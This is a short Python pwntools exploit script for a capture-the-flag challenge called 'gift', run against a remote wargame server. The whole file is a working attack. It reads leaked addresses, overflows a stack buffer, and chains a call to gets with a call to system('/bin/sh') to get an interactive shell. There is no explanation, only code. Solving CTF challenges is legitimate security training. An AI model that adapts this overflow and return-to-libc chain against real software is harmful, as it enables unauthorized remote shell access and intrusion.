#!/usr/bin/python 
from pwn import *

#p = process("./gift")
p = remote("ctf.j0n9hyun.xyz", 3018)
elf = ELF("./gift")
gets_plt = elf.plt['gets']
p1ret = 0x804866b

p.recvuntil(": ")
binsh_addr = int(p.recv(9), 16)
log.info("binsh addr : "+hex(binsh_addr))
p.recvuntil(" ")
system = int(p.recvuntil("\n"), 16)
log.info("system addr : "+hex(system))

p.sendline('A'*4)
pay = 'A'*(0x84 + 0x4)
pay += p32(gets_plt) 
pay += p32(p1ret) 
pay += p32(binsh_addr)
pay += p32(system)
pay += p32(p1ret)
pay += p32(binsh_addr)

p.sendline(pay)
p.sendline("/bin/sh\x00\x00")

p.interactive()
